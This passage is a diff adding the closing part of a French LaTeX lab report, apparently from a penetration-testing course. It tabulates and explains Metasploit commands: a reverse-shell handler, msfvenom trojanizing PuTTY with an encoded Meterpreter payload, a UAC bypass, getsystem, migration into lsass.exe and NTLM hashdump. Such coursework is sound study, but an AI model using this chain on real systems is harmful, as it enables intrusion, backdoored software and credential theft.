+\lstinline!python -m http.server! &
+  Lance un serveur web servant le répertoire courant sur le port 8000 (TCP). \\
+\lstinline!use exploit/multi/handler! &
+  Sélectionne l'écouteur générique de Metasploit. \\
+\lstinline!set payload windows/shell/reverse_tcp! &
+  Aligne le payload du handler sur celui de la charge. \\
+\lstinline!set LHOST 10.6.6.1! / \lstinline!set LPORT 9999! &
+  Fixent l'adresse et le port d'écoute (identiques à la charge). \\
+\lstinline!exploit -j! &
+  Démarre l'écouteur ; \texttt{-j} le lance en tâche de fond (\emph{job}). \\
+\lstinline!sessions -i 1! &
+  Interagit avec la session numéro 1. \\
+\lstinline!whoami /priv! &
+  (sur la cible) liste les privilèges du jeton courant. \\
+\midrule
+
+\multicolumn{2}{@{}l}{\textbf{\color{forceblue}Tâche 2 : cheval de Troie PuTTY (Meterpreter)}} \\*
+\midrule
+\lstinline!wget https://.../putty.exe -O putty.exe! &
+  Télécharge le binaire légitime ; \texttt{-O} impose le nom de sortie. \\
+\lstinline!msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=10.6.6.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -b "\x00" -f exe -o PUTTY.EXE! &
+  Injecte Meterpreter dans PuTTY. \texttt{-a} architecture ; \texttt{-{}-platform} OS cible ; \texttt{-x} binaire hôte ; \texttt{-k} garde son fonctionnement ; \texttt{-e}/\texttt{-i} encodeur et itérations ; \texttt{-b} octets à éviter ; \texttt{-o} fichier de sortie. \\
+\lstinline!set payload windows/meterpreter/reverse_tcp! &
+  Charge Meterpreter côté handler (port 4444). \\
+\midrule
+
+\multicolumn{2}{@{}l}{\textbf{\color{forceblue}Tâche 3 : élévation de privilèges}} \\*
+\midrule
+\lstinline!getuid! &
+  Affiche l'identité du compte de la session Meterpreter. \\
+\lstinline!background! &
+  Met la session courante en arrière-plan sans la fermer. \\
+\lstinline!use exploit/windows/local/bypassuac_eventvwr! &
+  Module local de contournement UAC via la clé de registre d'\texttt{eventvwr.exe}. \\
+\lstinline!set session 1! &
+  Désigne la session Meterpreter sur laquelle agir. \\
+\lstinline!run! / \lstinline!exploit! &
+  Exécute le module. \\
+\lstinline!getsystem! &
+  Tente d'élever jusqu'à \texttt{NT AUTHORITY\textbackslash SYSTEM} (Named Pipe Impersonation). \\
+\lstinline!getprivs! &
+  Liste les privilèges activés du jeton (confirme la haute intégrité). \\
+\lstinline!ps! &
+  Liste les processus (PID, utilisateur) pour choisir une cible de migration. \\
+\lstinline!migrate 492! &
+  Déplace Meterpreter dans un autre processus (ici \texttt{lsass.exe}, un process SYSTEM) pour stabilité/furtivité. \\
+\lstinline!hashdump! &
+  Extrait les empreintes NTLM des comptes locaux (nécessite SYSTEM). \\
+
+\end{longtable}
+
+\bigskip
+\signatureHamady
+
+\end{document}
